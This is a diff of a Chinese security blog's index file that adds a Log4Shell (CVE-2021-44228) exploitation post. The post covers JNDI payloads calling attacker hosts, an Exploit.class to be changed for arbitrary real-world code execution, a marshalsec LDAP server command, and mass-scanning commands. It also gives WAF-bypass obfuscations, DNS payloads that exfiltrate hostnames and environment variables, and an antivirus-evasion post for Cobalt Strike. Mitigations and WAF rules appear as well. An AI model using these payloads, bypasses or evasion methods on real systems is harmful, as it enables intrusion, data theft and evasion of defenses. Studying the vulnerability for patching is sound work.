@@ -1182,8 +1182,8 @@
         <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Ladon</tag>
+        <tag>Tool</tag>
       </tags>
   </entry>
   <entry>
@@ -1488,6 +1488,97 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>〖工具〗log4Shell核弹级漏洞复现&amp;Ladon批量检测</title>
+    <url>/p/log4shell.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/log4j/log4shell_1.PNG"></p>
+<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团队注意到了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Log4j2 中存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Log4j 2.0 &lt;= 2.15.0-rc1</p>
+<h3 id="影响产品"><a href="#影响产品" class="headerlink" title="影响产品"></a>影响产品</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Apache Struts</span><br><span class="line">Apache Struts 2</span><br><span class="line">Apache Solr</span><br><span class="line">Apache Druid</span><br><span class="line">Apache Flink</span><br><span class="line">Apache Spark</span><br><span class="line">Apache Tomcat</span><br><span class="line">ElasticSearch</span><br><span class="line">Flume</span><br><span class="line">Apache Dubbo</span><br><span class="line">Logstash</span><br><span class="line">Kafka</span><br><span class="line">Spring-Boot-starter-log4j2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RedHat     Not all RedHat packages are vulnerable, but some of the Openshift and JBoss packages are affected.     https://access.redhat.com/security/cve/cve-2021-4</span><br><span class="line"></span><br><span class="line">Jenkins     Although Jenkins Core is not affected by default, plug-ins installed <span class="keyword">in</span> Jenkins can use the vulnerable version of Log4J. There is also a method to verify <span class="keyword">if</span> any of the plug-ins installed uses Log4j. The second link contains a list of the vulnerable versions of the plug-in that have been found as of this writing.     </span><br><span class="line"></span><br><span class="line">https://www.jenkins.io/blog/2021/12/10/log4j2-rce-CVE-2021-44228/</span><br><span class="line"></span><br><span class="line">https://issues.jenkins.io/browse/JENKINS-67353?focusedCommentId=416946&amp;page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel<span class="comment">#comment-416946</span></span><br><span class="line"></span><br><span class="line">Apache Solr     Apache Solr releases prior to 7.4 are affected.     https://solr.apache.org/security.html<span class="comment">#apache-solr-affected-by-apache-log4j-cve-2021-44228</span></span><br><span class="line"></span><br><span class="line">VMWare     Multiple products are affected.     https://www.vmware.com/security/advisories/VMSA-2021-0028.html</span><br><span class="line"></span><br><span class="line">Citrix     Investigation pending     https://support.citrix.com/article/CTX335705</span><br><span class="line"></span><br><span class="line">Atlassian     Atlassian is vulnerable <span class="keyword">if</span> the default configuration was modified.     https://confluence.atlassian.com/kb/faq-for-cve-2021-44228-1103069406.html</span><br><span class="line"></span><br><span class="line">NetApp     Multiple NetApp products are vulnerable.     https://security.netapp.com/advisory/ntap-20211210-0007/</span><br></pre></td></tr></table></figure>
+
+<p>PS: 除了本文列的这些产品，还有很多产品受到影响，具体可Google搜漏洞编号加产品名称，若是官方公告注明哪些版本修复漏洞或哪些版本测试存在漏洞，就代表该产品受到影响，不用你一个个搭环境测试，先不说搭各种环境费时间，就算搭好了触发点在哪，你也得测好长时间，所以要善用搜索引擎。</p>
+<h3 id="漏洞环境1"><a href="#漏洞环境1" class="headerlink" title="漏洞环境1"></a>漏洞环境1</h3><p>使用IDEA新建项目，漏洞示例代码如下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class log4j &#123;</span><br><span class="line">    private static final Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //logger.error(<span class="string">"<span class="variable">$&#123;jndi:ldap://192.168.250.83:800/calc&#125;</span>"</span>);</span><br><span class="line">        logger.error(<span class="string">"<span class="variable">$&#123;jndi:rmi://192.168.250.83:800/calc&#125;</span>"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞复现1"><a href="#漏洞复现1" class="headerlink" title="漏洞复现1"></a>漏洞复现1</h3><p>启用Ladon的web监听，编译执行Poc项目，可看到Ladon回显目标IP以及提交的数据，Ldap出现一些特殊符号，最明显的是几个笑脸，Rmi回显前几个字符串为JRMI，回显以下特征说明目标存在jdni注入漏洞。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon web 800</span><br></pre></td></tr></table></figure>
+
+<p><img alt data-original="http://k8gege.org/k8img/posts/log4j/log4shell_2.PNG"></p>
+<p>其实也不是非要jndi来远程测试漏洞，log4j也支持java获取信息环境变量等，本地APP需要测试还好，实战是盲测，不像本地可以后台看，实战你只能外带，所以才用到jndi协议，有些人问为什么不用其它协议，因为受漏洞限制只能jndi协议，利用你就得看jndi支持什么协议，你才能利用什么协议。如以下代码，编译项目执行，会输出版本和操作系统信息。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">logger.error(<span class="string">"<span class="variable">$&#123;java:version&#125;</span>/<span class="variable">$&#123;java:os&#125;</span>"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也可使用以下协议探测</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap:/&#125;</span></span><br><span class="line"><span class="variable">$&#123;jndi:ldaps:/&#125;</span></span><br><span class="line"><span class="variable">$&#123;jndi:rmi:/&#125;</span></span><br><span class="line"><span class="variable">$&#123;jndi:dns:/&#125;</span></span><br><span class="line"><span class="variable">$&#123;jndi:iiop:/&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img alt data-original="http://k8gege.org/k8img/posts/log4j/log4shell_3.PNG"></p>
+<h3 id="漏洞环境2"><a href="#漏洞环境2" class="headerlink" title="漏洞环境2"></a>漏洞环境2</h3><p>使用docker搭建环境，这样可模拟从内网另一台机来攻击该机器</p>
+<p>docker pull vulfocus/log4j2-rce-2021-12-09:latest</p>
+<h3 id="启动环境2"><a href="#启动环境2" class="headerlink" title="启动环境2"></a>启动环境2</h3><p>docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/log4j/log4shell_4.PNG"></p>
+<h3 id="漏洞复现2"><a href="#漏洞复现2" class="headerlink" title="漏洞复现2"></a>漏洞复现2</h3><p>由于不知道漏洞触发点，使用LadonExp.exe盲测，发现注入点为Accept参数,测试方法所有参数均填写payload，目标URL填写需要测试的站点，点击Build_Exe，然后点击Test_exe测试即可。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/log4j/log4shell_5.PNG"></p>
+<p>改成rmi协议时，发现无法触发，于是看了下环境的JDK版本，发现是292的，JDK1.8 191起默认不支持RMI协议，所以用rmi测试失败。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@4e4424eccb8d:/demo<span class="comment"># java -version</span></span><br><span class="line">openjdk version <span class="string">"1.8.0_292"</span></span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_292-8u292-b10-0ubuntu1~18.04-b10)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)</span><br></pre></td></tr></table></figure>
+
+<h5 id="以下协议自行测试"><a href="#以下协议自行测试" class="headerlink" title="以下协议自行测试"></a>以下协议自行测试</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$&#123;date:ldap://</span><br><span class="line">$&#123;java:ldap://</span><br><span class="line">$&#123;marker:ldap://</span><br><span class="line">$&#123;ctx:ldap://</span><br><span class="line">$&#123;lower:ldap://</span><br><span class="line">$&#123;upper:ldap://</span><br><span class="line">$&#123;jndi:ldap://</span><br><span class="line">$&#123;jndi:rmi://</span><br><span class="line">$&#123;main:ldap://</span><br><span class="line">$&#123;jvmrunargs:ldap://</span><br><span class="line">$&#123;sys:ldap://</span><br><span class="line">$&#123;env:ldap://</span><br><span class="line">$&#123;log4j:ldap://</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量检测C段"><a href="#批量检测C段" class="headerlink" title="批量检测C段"></a>批量检测C段</h4><p>将LadonExp生成的exe改名为log4poc.exe，使用以下命令即可批量检测C段站点是否存在log4j的jndi注入漏洞。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.1/c log4poc.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量检测url-txt"><a href="#批量检测url-txt" class="headerlink" title="批量检测url.txt"></a>批量检测url.txt</h4><p>提供你已找好使用JAVA开发的站点URL，存放于url.txt，使用以下命令检测</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt log4poc.exe</span><br></pre></td></tr></table></figure>
+
+<p>PS: 有人说Ladon为什么不提供log4j漏洞检测，实际上早提供了，之前我不是发过好几篇使用LadonExp一键生成漏洞Poc的演示文章吗？不需要懂编程，只要懂漏洞原理，抓别人的包，填写对应参数，就可快速实战批量使用新的POC，这技能你们都不学，错过了最佳时期别怪我啊…</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>使用JAVA编译exp.java生成我们的反序列化类Exploit.class，放在Ladon目录下，使用Ladon web 800一键开启渗透专用迷你web服务器。演示代码为弹出计算器，实战自行修改代码实现任意功能，不只是执行CMD。要知道所谓CMD命令也是由各编程语言的代码编译成EXE后才是你所使用的命令，代码执行可做CMD做不了的很多事，这是代码执行和命令执行的最大区别。本漏洞主要是受限于触发的jndi协议限制，不能本地内部执行代码或命令，需远程加载，实际上也能执行些简短代码的,如漏洞环境1</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//javac exp.java</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        System.err.println(<span class="string">"k8gege"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            String test= <span class="string">"calc"</span>;</span><br><span class="line"></span><br><span class="line">            Runtime.getRuntime().exec(test);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动Ladp服务器"><a href="#启动Ladp服务器" class="headerlink" title="启动Ladp服务器"></a>启动Ladp服务器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">"http://192.168.250.83:800/#Exploit"</span></span><br></pre></td></tr></table></figure>
+<p>将漏洞复现1的POC代码修改，指向我们的ldap服务器，编译执行弹出calc</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/log4j/log4shell.gif"></p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://$&#123;hostName&#125;</span>.log4shell.k8gege.org&#125;</span><br><span class="line"><span class="variable">$&#123;jndi:rmi://$&#123;hostName&#125;</span>.log4shell.k8gege.org&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ladon监听"><a href="#Ladon监听" class="headerlink" title="Ladon监听"></a>Ladon监听</h3><p>${jndi:ldap://192.168.1.8:800/test}<br>${jndi:rmi://192.168.1.8:800/test}</p>
+<h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:dns://$&#123;hostName&#125;</span>.log4shell.k8gege.org&#125;</span><br><span class="line"><span class="variable">$&#123;jndi:dns://$&#123;env:COMPUTERNAME&#125;</span>.log4shell.k8gege.org&#125;</span><br><span class="line"><span class="variable">$&#123;jndi:dns://$&#123;env:USERDOMAIN&#125;</span>.log4shell.k8gege.org&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="WAF拦截规则"><a href="#WAF拦截规则" class="headerlink" title="WAF拦截规则"></a>WAF拦截规则</h3><p>应急时可能WAF使用以下特征拦截，很明显治标不治本，只能暂时缓解</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$&#123;date:ldap://</span><br><span class="line">$&#123;java:ldap://</span><br><span class="line">$&#123;marker:ldap://</span><br><span class="line">$&#123;ctx:ldap://</span><br><span class="line">$&#123;lower:ldap://</span><br><span class="line">$&#123;upper:ldap://</span><br><span class="line">$&#123;jndi:ldap://</span><br><span class="line">$&#123;jndi:rmi://</span><br><span class="line">$&#123;main:ldap://</span><br><span class="line">$&#123;jvmrunargs:ldap://</span><br><span class="line">$&#123;sys:ldap://</span><br><span class="line">$&#123;env:ldap://</span><br><span class="line">$&#123;log4j:ldap://</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bypass-RC1"><a href="#Bypass-RC1" class="headerlink" title="Bypass RC1"></a>Bypass RC1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;$&#123;::-j&#125;</span><span class="variable">$&#123;::-n&#125;</span><span class="variable">$&#123;::-d&#125;</span><span class="variable">$&#123;::-i&#125;</span>:<span class="variable">$&#123;::-r&#125;</span><span class="variable">$&#123;::-m&#125;</span><span class="variable">$&#123;::-i&#125;</span>://k123.k123.k123/poc&#125;</span><br><span class="line"><span class="variable">$&#123;$&#123;::-j&#125;</span>ndi:rmi://k123.k123.k123/ass&#125;</span><br><span class="line"><span class="variable">$&#123;jndi:rmi://k8.k123.k123&#125;</span></span><br><span class="line"><span class="variable">$&#123;$&#123;lower:jndi&#125;</span>:<span class="variable">$&#123;lower:rmi&#125;</span>://k8.k123.k123/poc&#125;</span><br><span class="line"><span class="variable">$&#123;$&#123;lower:$&#123;lower:jndi&#125;</span>&#125;:<span class="variable">$&#123;lower:rmi&#125;</span>://k8.k123.k123/poc&#125;</span><br><span class="line"><span class="variable">$&#123;$&#123;lower:j&#125;</span><span class="variable">$&#123;lower:n&#125;</span><span class="variable">$&#123;lower:d&#125;</span>i:<span class="variable">$&#123;lower:rmi&#125;</span>://k8.k123.k123/poc&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="该漏洞利用条件"><a href="#该漏洞利用条件" class="headerlink" title="该漏洞利用条件"></a>该漏洞利用条件</h3><pre><code>Log4j2版本Log4j 2.0 &lt;= 2.15.0-rc1，并非有调用log4j就有洞
+
+JDK版本限制，jdk8u191之后RMI和LDAP默认不能从远程加载类
+
+可能产生日志记录的地方，用户登陆日志记录啊，UserAgent、Cookie等，谁知道网站开发者想记录用户什么数据？不确定的情况下，盲测但凡有参数的地方，我们都可以尝试，或许有惊喜。
+
+目标允许出网，不能出网，存在洞你也不知道，除非你已进入内网，通过Ladon在内网监听，测试内网站点是否存在jndi漏洞。假设机器只允许dns出网，使用Dnslog探测存在漏洞，TCP协议出不了，ldap、rmi等无法加载class，你也拿不了shell啊，存在洞和能拿权限是两回事。</code></pre><p>PS: 该漏洞说大影响大嘛也是真的非常大，但说它鸡肋也鸡肋，因为我的目标就没一个成功的，或许存在洞的机器早已通过其它洞拿下，</p>
+<h3 id="有些人问为什么不用dnslog？"><a href="#有些人问为什么不用dnslog？" class="headerlink" title="有些人问为什么不用dnslog？"></a>有些人问为什么不用dnslog？</h3><p>你喜欢用dnslog的话也可以，没什么问题，只是这几天这洞玩的人太多，dnslog经常卡死，无法使用，这是第一个原因。其次使用dnslog，意味着我们的目标或者说正在测试只有内部人知道公司某些服务器使用log4j，若是别人也随机到和你相同的域名，你们公司存在漏洞的站点IP泄露出去，会是什么后果？使用自己的VPS来搭建的接收器才是最安全的，当然ldap或rmi协议出不来的话，就只能用dnslog来接收dns协议，因为Ladon无法监听DNS协议，当然要是你要时间也可以完全自己搭个DNS服务器还接收。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/log4j/log4shell_6.PNG"></p>
+<h3 id="为什么Ladon能监听LDAP、RMI？"><a href="#为什么Ladon能监听LDAP、RMI？" class="headerlink" title="为什么Ladon能监听LDAP、RMI？"></a>为什么Ladon能监听LDAP、RMI？</h3><p>为什么ldap、rmi、http等协议Ladon可以监听到，因为它们本身就是特殊的tcp协议，所以Ladon当然能捕获到。初中有没学过正方形是特殊的长方形，就是说你把正方形说成长方形也没错，Ladon虽然主要只是解析HTTP协议，但也没完全对其它协议进行丢弃，只要对前面部份数据16进制原样解析还是会看到一些明显的字眼如JRMI协议，所以Ladon对于一些非HTTP协议也可以从控制台看出来，同理以后其它无回显漏洞也可以使用Ladon监听，之前我也发过3篇文章，Linux无回显渗透、Java无回显渗透、PowerShell等，大家一定要学会举一反三，不要非要等别人告诉你，你才知道在这种场景也能用。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h4><p>更新至官方修复版本</p>
+<p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2" target="_blank" rel="noopener">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+<h4 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h4><p>①在jvm启动参数中添加</p>
+<p>Dlog4j2.formatMsgNoLookups=true<br>②系统环境变量中配置FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true<br>③项目中创建log4j2.component.properties文件，文件中增加配置log4j2.formatMsgNoLookups=true</p>
+<h3 id="Log4j-JAVA"><a href="#Log4j-JAVA" class="headerlink" title="Log4j-JAVA"></a>Log4j-JAVA</h3><h4 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ID     usage     method</span><br><span class="line">1     <span class="variable">$&#123;java:version&#125;</span>     getSystemProperty(<span class="string">"java.version"</span>)</span><br><span class="line">2     <span class="variable">$&#123;java:runtime&#125;</span>     getRuntime()</span><br><span class="line">3     <span class="variable">$&#123;java:vm&#125;</span>     getVirtualMachine()</span><br><span class="line">4     <span class="variable">$&#123;java:os&#125;</span>     getOperatingSystem()</span><br><span class="line">5     <span class="variable">$&#123;java:hw&#125;</span>     getHardware()</span><br><span class="line">6     <span class="variable">$&#123;java:locale&#125;</span>     getLocale()</span><br></pre></td></tr></table></figure>
+
+<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id     usage</span><br><span class="line">1     <span class="variable">$&#123;env:A8_HOME&#125;</span></span><br><span class="line">2     <span class="variable">$&#123;env:A8_ROOT_BIN&#125;</span></span><br><span class="line">3     <span class="variable">$&#123;env:ALLUSERSPROFILE&#125;</span></span><br><span class="line">4     <span class="variable">$&#123;env:APPDATA&#125;</span></span><br><span class="line">5     <span class="variable">$&#123;env:CATALINA_BASE&#125;</span></span><br><span class="line">6     <span class="variable">$&#123;env:CATALINA_HOME&#125;</span></span><br><span class="line">7     <span class="variable">$&#123;env:CATALINA_OPTS&#125;</span></span><br><span class="line">8     <span class="variable">$&#123;env:CATALINA_TMPDIR&#125;</span></span><br><span class="line">9     <span class="variable">$&#123;env:CLASSPATH&#125;</span></span><br><span class="line">10     <span class="variable">$&#123;env:CLIENTNAME&#125;</span></span><br><span class="line">11     <span class="variable">$&#123;env:COMPUTERNAME&#125;</span></span><br><span class="line">12     <span class="variable">$&#123;env:ComSpec&#125;</span></span><br><span class="line">13     <span class="variable">$&#123;env:CommonProgramFiles&#125;</span></span><br><span class="line">14     <span class="variable">$&#123;env:CommonProgramFiles(x86)&#125;</span></span><br><span class="line">15     <span class="variable">$&#123;env:CommonProgramW6432&#125;</span></span><br><span class="line">16     <span class="variable">$&#123;env:FP_NO_HOST_CHECK&#125;</span></span><br><span class="line">17     <span class="variable">$&#123;env:HOMEDRIVE&#125;</span></span><br><span class="line">18     <span class="variable">$&#123;env:HOMEPATH&#125;</span></span><br><span class="line">19     <span class="variable">$&#123;env:JRE_HOME&#125;</span></span><br><span class="line">20     <span class="variable">$&#123;env:Java_Home&#125;</span></span><br><span class="line">21     <span class="variable">$&#123;env:LOCALAPPDATA&#125;</span></span><br><span class="line">22     <span class="variable">$&#123;env:LOGONSERVER&#125;</span></span><br><span class="line">23     <span class="variable">$&#123;env:NUMBER_OF_PROCESSORS&#125;</span></span><br><span class="line">24     <span class="variable">$&#123;env:OS&#125;</span></span><br><span class="line">25     <span class="variable">$&#123;env:PATHEXT&#125;</span></span><br><span class="line">26     <span class="variable">$&#123;env:PROCESSOR_ARCHITECTURE&#125;</span></span><br><span class="line">27     <span class="variable">$&#123;env:PROCESSOR_IDENTIFIER&#125;</span></span><br><span class="line">28     <span class="variable">$&#123;env:PROCESSOR_LEVEL&#125;</span></span><br><span class="line">29     <span class="variable">$&#123;env:PROCESSOR_REVISION&#125;</span></span><br><span class="line">30     <span class="variable">$&#123;env:PROMPT&#125;</span></span><br><span class="line">31     <span class="variable">$&#123;env:PSModulePath&#125;</span></span><br><span class="line">32     <span class="variable">$&#123;env:PUBLIC&#125;</span></span><br><span class="line">33     <span class="variable">$&#123;env:Path&#125;</span></span><br><span class="line">34     <span class="variable">$&#123;env:ProgramData&#125;</span></span><br><span class="line">35     <span class="variable">$&#123;env:ProgramFiles&#125;</span></span><br><span class="line">36     <span class="variable">$&#123;env:ProgramFiles(x86)&#125;</span></span><br><span class="line">37     <span class="variable">$&#123;env:ProgramW6432&#125;</span></span><br><span class="line">38     <span class="variable">$&#123;env:SESSIONNAME&#125;</span></span><br><span class="line">39     <span class="variable">$&#123;env:SystemDrive&#125;</span></span><br><span class="line">40     <span class="variable">$&#123;env:SystemRoot&#125;</span></span><br><span class="line">41     <span class="variable">$&#123;env:TEMP&#125;</span></span><br><span class="line">42     <span class="variable">$&#123;env:TMP&#125;</span></span><br><span class="line">43     <span class="variable">$&#123;env:ThisExitCode&#125;</span></span><br><span class="line">44     <span class="variable">$&#123;env:USERDOMAIN&#125;</span></span><br><span class="line">45     <span class="variable">$&#123;env:USERNAME&#125;</span></span><br><span class="line">46     <span class="variable">$&#123;env:USERPROFILE&#125;</span></span><br><span class="line">47     <span class="variable">$&#123;env:WORK_PATH&#125;</span></span><br><span class="line">48     <span class="variable">$&#123;env:windir&#125;</span></span><br><span class="line">49     <span class="variable">$&#123;env:windows_tracing_flags&#125;</span></span><br><span class="line">50     <span class="variable">$&#123;env:windows_tracing_logfile&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>LadonGo 3.8: <a href="https://github.com/k8gege/LadonGo" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo</a><br>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>9.1版本：K8小密圈</p>
+]]></content>
+      <categories>
+        <category>exp</category>
+      </categories>
+      <tags>
+        <tag>Log4j2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>〖工具〗Ladon 9.1.1 &amp; CobaltStrike神龙插件发布</title>
     <url>/p/cs911.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
@@ -1560,12 +1651,12 @@ window.location.href="http://k8gege.org/Ladon/cs911.html";
     <url>/p/bypass_win10_20h2_defender.html</url>
     <content><![CDATA[<p>WIN10更新至最新版20H2发现，查杀能力比以前强了不少，特别是针对CS加载.NET程序集或NIM加载.NET的查杀，毕竟你要调用的函数微软很了解，它想拦截想杀还是比较容易的。但是不知道大家有没听说过一个故事“微软的编程工具的开发工程师，编写程序时，也需要查阅文档”，说明什么？微软系统的API很多，是微软写的没错，但又不是一个人自己写的，就算是一个人自己写的，功能那么多，他也根本记不起，用到自己的东西也要查阅文档，就像我用Ladon有时也要查阅文档，这很正常，因为我写过的工具或功能太多，有些久不用，甚至都会忘记我自己写过什么。所以我想说的是，微软就算做杀软，它也不可能做到全面监控，因为参与开发杀软的人，它不可能对微软系统上百万函数了如指掌，越是大型程序，需要的开发人员越多，很多人都只是负责某一模块对整个系统可能只是一只半解，所以Defender虽然查杀能力某些方面有点加强了，但是很多方面它依旧无法查杀，还没达到自己人写的程序就真比其它杀软牛B的地步，那些专门做杀软的，逆向能力很强，有BIN文件对他们来说就相当于源代码，很多人比微软员工还要了解win系统。举个简单的例子，你在某公司工作，有些员工可能你压根都不认识，更别说和公司所有程序员了解他们所写过的代码，微软的操作系统有多少人来写，defender这部门又只有多少人，他们怎么可能把所有函数都了解，就算24小时不吃饭不做任何事，只研究代码也做不到全面查杀或拦截，至少最近几年还比不过很多主流杀软。任何一个杀软能查杀一个全球大量人使用的工具这是应该也是必须的很常规的考验，杀了不代表这杀软就强了，但是不杀它一定是垃圾。如CS，因为全球大量人使用，任何一个杀软杀它都说明不了什么。好了废话不多说，进入正题。</p>
 <h3 id="GO异或加密免杀"><a href="#GO异或加密免杀" class="headerlink" title="GO异或加密免杀"></a>GO异或加密免杀</h3><p>使用GO免杀CS的shellcode，生成的dll上线成功执行CMD命令正常，但执行dumplsass等相关高危功能或加载Ladon时被杀，CS直接下线，甚至加载一个只输出hello world的.net程序集也会被杀，这样会导致我们瞬间失去很多后渗透工具插件带来的便利，这是2021.11.19号的病毒库查杀情况。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_1.PNG"></p>
-<p><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_2.PNG"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_1.PNG"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_2.PNG"></p>
 <p>这种情况怎么解决？CS无法加载Ladon插件，那么我们只能把Ladon传过去了，但测试发现Ladon.exe也被杀，我的发克，竟然还说是木马。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_3.PNG"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_3.PNG"></p>
 <h3 id="Nim免杀-net"><a href="#Nim免杀-net" class="headerlink" title="Nim免杀.net"></a>Nim免杀.net</h3><p>9月份的时候该方法针对Denfender还是可以的，所以我们可以尝试一下。使用net2nim工具将.net程序转换成bytes，并使用nim加载编译生成新程序,可过一些杀软及旧版Win10 Defender，如图所示</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_4.PNG"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_4.PNG"></p>
 <h4 id="安装Nim"><a href="#安装Nim" class="headerlink" title="安装Nim"></a>安装Nim</h4><p><a href="https://nim-lang.org/" target="_blank" rel="noopener">https://nim-lang.org/</a><br>下载zip大约20M<br>设置环境变量  F:\nim-1.4.8\bin</p>
 <h4 id="安装winim"><a href="#安装winim" class="headerlink" title="安装winim"></a>安装winim</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;nimble install winim</span><br><span class="line">Downloading https://github.com/khchen/winim using git</span><br><span class="line">  Verifying dependencies <span class="keyword">for</span> winim@3.6.1</span><br><span class="line"> Installing winim@3.6.1</span><br><span class="line">   Success: winim installed successfully.</span><br></pre></td></tr></table></figure>
 
@@ -1573,19 +1664,19 @@ window.location.href="http://k8gege.org/Ladon/cs911.html";
 
 
 <p>使用Nim加载.net程序集也可以免杀不少杀软，在此版本之前也可过Defender，但Win10更新至20H2后虽然静态不杀，但一执行会被拦截，提示CLR加载错误，程序也不杀，但无法使用其功能，相当于免杀失败。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts%5Cwin10%5C20h2_5.PNG"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/win10/20h2_5.PNG"></p>
